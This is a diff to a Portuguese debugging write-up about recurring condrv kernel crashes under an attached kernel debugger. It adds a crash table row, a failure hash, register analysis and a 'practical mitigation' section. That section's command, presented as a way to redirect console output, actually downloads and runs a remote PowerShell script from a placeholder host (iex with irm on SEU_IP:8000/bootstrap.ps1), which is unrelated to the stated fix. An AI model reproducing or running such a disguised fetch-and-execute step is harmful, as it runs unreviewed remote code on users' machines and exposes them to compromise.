@@ -736,9 +736,39 @@ nenhum com o driver envolvido:
 |---|---|---|
 | `0x3B` | `condrv!CdCompleteIo`, em `conhost.exe` | não |
 | `0xA` | `nt!KiDeliverApc` vindo de `NtDeviceIoControlFile` do console, em `powershell.exe` | não |
+| `0x3B` | `condrv!CdCompleteIo`, em `conhost.exe` — **de novo** | não |
 
-O regime que os produz parece ser console sob carga com um depurador de
-kernel anexado. Custaram duas rodadas de investigação antes de alguém rodar
+A terceira é a mesma da primeira, e não uma parecida:
+
+```
+FAILURE_BUCKET_ID:  AV_VRF_condrv!CdCompleteIo
+FAILURE_ID_HASH:    {41e0b369-a357-fa62-918e-7693f62a5e41}
+```
+
+Se o `!analyze -v` produzir esse hash, pare: é este defeito, já triado, e
+não há nada de novo a aprender com ele.
+
+Os registros dizem o resto. No terceiro, `rbx = 0909090909090861` e
+`rcx = 0909090909090909` — isso não é endereço, é padrão de preenchimento.
+O `condrv` está desreferenciando uma estrutura liberada ou nunca
+inicializada na própria fila de I/O do console. A terceira ocorreu com
+2 min 48 s de uptime, antes de a bateria sequer carregar o filtro.
+
+O regime que os produz é console sob carga com um depurador de kernel
+anexado — e o depurador não é espectador: ele muda o tempo de tudo, que é
+justamente o que expõe corrida de liberação.
+
+**Mitigação prática.** Anexar o WinDbg só quando houver o que depurar no
+nosso driver. Para execução de rotina da bateria, sem depurador, o console
+segue o caminho normal e as três ocorrências aconteceram todas com ele
+anexado. Redirecionar a saída para arquivo também reduz o volume de I/O de
+console, que é o que alimenta o defeito:
+
+```
+powershell -NoProfile -Command "iex (irm http://SEU_IP:8000/bootstrap.ps1)" > C:\safeuploadun.log 2>&1
+```
+
+Custaram três rodadas de investigação antes de alguém rodar
 `lm m SafeUpload`. Rode primeiro.
 
 Uma ressalva honesta: corrupção de memória causada por um driver pode
